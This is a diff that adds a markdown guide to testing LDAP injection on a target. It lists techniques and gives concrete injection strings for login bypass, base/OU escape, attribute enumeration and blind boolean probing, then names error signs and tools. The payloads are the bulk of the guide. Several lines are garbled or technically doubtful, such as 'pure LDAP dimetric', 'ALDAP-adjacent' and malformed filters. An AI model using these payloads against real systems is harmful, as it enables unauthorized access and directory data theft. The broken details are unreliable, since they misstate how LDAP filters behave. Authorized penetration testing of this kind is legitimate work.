@@ -1,0 +1,45 @@
+# HOW TO TEST LDAP INJECTION ON A TARGET (2026 expert guide)
+
+## The N ways to test
+1. Auth bypass: inject metachars & | ! = ( ) * to make LDAP filter always-true.
+2. Blind audit filter: userDN / bindDN field injection.
+3. Group/base injection: dn= dc= injection into base/scope to escape an OU.
+4. Attribute extraction: () wildcard in search filter to enumerate.
+5. Data exfil: mail, cn, userPassword attribute * in filter.
+6. Wildcard dos: (&(...)(uid=*))( userPassword=* ) enumeration cascades.
+7. Error-basis: malformed ) - count responses to time bases.
+8. Sanitizer bypass: escape sequences, null-byte, double-encoding variations.
+
+## Step-by-step on target
+1. Find the LDAP-backed param (login usernames after SSO/portal, search boxes, user lookup).
+2. From the AUTHORIZED test account, try logical bind bypass first.
+3. If that fails, time/boolean attacks to carve attributes.
+4. If the app is pure LDAP dimetric: try search filter injection on any user/group lookup.
+
+## Worked examples (concrete)
+# Auth bypass in (uid=<user>&(userPassword=*)) style bind:
+username = *)(uid=*))(|(uid=*
+username = admin)(|(password=*
+password = *)(|(password=*
+# using & filter:  (&(uid=*)(uid=*)) and in groups
+# Group/base escape:
+user = *)((|(cn=*
+base  = ou=users)(|(objectClass=*))(dc=
+# Attribute wildcard (enumerate all attributes for user X):
+param=*)(|(mail=*))(objectClass=user)(cn=
+# Blind boolean via response dims/error vs success:
+user=admin)(|(objectClass=*))  -> compare true vs false output.
+# Time-based (LDAP evaluator in some ALDAP-adjacent filters): none standard - skip unless LDAP does.
+# Escape-encoding probe:  user=admin) (1C1C  etc.) -> then double-encode.
+
+## Detecting the backend
+# Errors like: "Invalid DN", "malformed filter", "LDAP error 0x51" = sure-win.
+# If the login param hits a directory on backup -> likely same.
+
+## False positives
+- Some LDAP stacks bind filter to CONTEXT position so injection chars alter scope not enough -> 
+  report only with a reproducible escape that CHANGES responses.
+- Integer-based lookups are not LDAP.
+
+## Tools
+- Burp LDAPIntruder payloads, w3af ldap, ldapsearch (authorized scope bind), own param tampering.
